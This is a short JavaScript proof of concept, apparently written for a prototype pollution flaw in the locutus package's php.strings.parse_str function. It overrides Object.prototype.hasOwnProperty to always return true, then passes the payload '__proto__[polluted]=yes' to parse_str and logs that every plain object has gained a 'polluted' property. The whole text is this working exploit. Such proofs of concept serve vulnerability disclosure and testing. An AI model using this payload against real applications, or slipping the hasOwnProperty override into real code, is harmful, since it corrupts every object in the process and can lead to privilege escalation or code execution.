Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const locutus = require('locutus');
locutus.php.strings.parse_str('__proto__[polluted]=yes');
console.log({}.polluted);